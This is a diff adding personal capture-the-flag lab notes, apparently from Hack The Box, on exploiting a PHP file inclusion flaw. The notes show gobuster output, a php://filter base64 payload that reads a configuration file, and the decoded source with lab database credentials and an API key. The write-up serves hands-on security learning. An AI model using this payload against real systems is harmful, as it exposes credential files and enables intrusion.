@@ -489,3 +489,53 @@ we should calculate the full length of the string to ensure only `.php` gets t
 ![[Pasted image 20250803183401.png]]
 
 
+
+
+Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
+
+running gobuster got me 
+
+```
+/.php                 (Status: 403) [Size: 281]
+/index.php            (Status: 200) [Size: 2652]
+/en.php               (Status: 200) [Size: 0]
+/es.php               (Status: 200) [Size: 0]
+/configure.php        (Status: 302) [Size: 0] [--> /index.php]
+
+```
+
+payload : ```url
+php://filter/read=convert.base64-encode/resource=configure```
+
+i got this 
+
+PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7
+
+
+using cyberchef 
+
+```
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
+  header('HTTP/1.0 403 Forbidden', TRUE, 403);
+  die(header('location: /index.php'));
+}
+
+$config = array(
+  'DB_HOST' => 'db.inlanefreight.local',
+  'DB_USERNAME' => 'root',
+  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
+  'DB_DATABASE' => 'blogdb'
+);
+
+$API_KEY = "Awew242GDshrf46+35/k";
+
+```
+
+
+- PHP will treat it as if you said `include("configure")`
+    
+- If `configure` is PHP code, it will run it — so you won’t see the source.
+
+so we need to convert the result to php to process and show in encode format
